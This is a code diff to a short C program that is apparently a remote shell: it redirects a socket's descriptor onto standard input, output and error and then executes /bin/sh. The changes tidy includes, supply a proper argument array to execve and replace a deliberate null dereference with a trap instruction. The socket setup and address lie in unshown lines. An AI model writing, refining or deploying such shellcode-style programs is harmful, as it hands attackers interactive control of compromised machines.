@@ -1,10 +1,9 @@
 #include <unistd.h>
 #include <stdio.h>
-#include <unistd.h>
+
 #include <netinet/in.h>
 #include <arpa/inet.h>
 
-#include <sys/types.h>
 #include <sys/socket.h>
 
 #include <string.h>
@@ -45,9 +44,11 @@ int main()
     dup2(sfd, 1);
     dup2(sfd, 2);
 
-    execve("/bin/sh", NULL, NULL);
+    char *const shArgs[] = {[0] = "", NULL};
+
+    execve("/bin/sh", shArgs, NULL);
 
     /* Doesn't close the socket connection */
     /* This program never returns */
-    return *(int*)(NULL);
+    __builtin_trap();
 }
